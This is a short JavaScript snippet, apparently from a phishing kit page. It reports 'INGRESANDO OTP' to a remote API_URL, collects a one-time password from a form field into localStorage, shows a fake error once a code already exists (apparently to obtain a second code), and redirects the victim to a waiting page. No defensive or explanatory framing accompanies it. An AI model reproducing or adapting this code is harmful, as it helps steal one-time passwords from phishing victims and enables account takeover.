fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'INGRESANDO OTP'
    })
});

if(info.tok !== ''){
    document.querySelector('.error').classList.remove('d-none');
}

document.querySelector('#form-otp').addEventListener('submit', (e) => {
    e.preventDefault();

    info.tok = document.querySelector('#otp').value;
    LS.setItem('info', JSON.stringify(info));
    window.location.href = 'waiting.html';
});